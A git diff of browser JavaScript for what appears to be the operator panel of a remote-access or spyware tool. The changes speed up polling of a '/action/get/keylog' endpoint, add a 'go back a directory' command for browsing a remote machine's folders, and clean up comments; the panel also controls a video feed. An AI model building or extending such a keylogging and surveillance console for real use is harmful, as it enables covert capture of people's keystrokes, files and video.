@@ -4,7 +4,7 @@ const dirbox = document.getElementById('dirbox');
 const file_selector = document.getElementById('file_selector');
 
 
-const update_interval = 5000;
+const update_interval = 1000;
 
 document.getElementById('refresh_file').addEventListener('click', function () {
     request('/action/get/folders')
@@ -12,6 +12,7 @@ document.getElementById('refresh_file').addEventListener('click', function () {
 
 document.getElementById('back_a_dir').addEventListener('click', function () {//go back a directory button
     console.log('back_a_dir clicked');
+    post(JSON.stringify({action:'go_back_a_dir'}),'/action/post/folders/instruct')//Post go back instruction to server
 
 });
 document.getElementById("stop_video").addEventListener('click', function () {//stop video feed button
@@ -24,12 +25,9 @@ document.getElementById("start_video").addEventListener('click', function () {//
 });
 
 window.addEventListener('load', function () {
-    request('/action/get/folders')
+    request('/action/get/folders')//reequest folders when th page loads
     setInterval(() => {
-        //request('/action/get/keylog').then(keylog =>{ writeoutkeylog(JSON.parse(keylog)) })
-        request('/action/get/keylog')
-        //request('/action/get/folders')
-        //console.log('Keylog: ', request('/action/get/keylog')/*,' Folders: ',request('/action/get/folders')*/)
+        request('/action/get/keylog')//get th keylog repeatedly
     }, update_interval);
 })
 
@@ -38,7 +36,9 @@ async function request(what) {//make a request to server
 
     xhttp.onreadystatechange = function () {
         if (this.readyState == 4 && this.status == 200) {
-            var resput = JSON.parse(this.responseText)
+
+            var resput = JSON.parse(this.responseText)//Resplnce is an object form the server
+
             console.log('Sever responed with: ', resput)
             switch (what) {
                 case '/action/get/keylog'://keylog
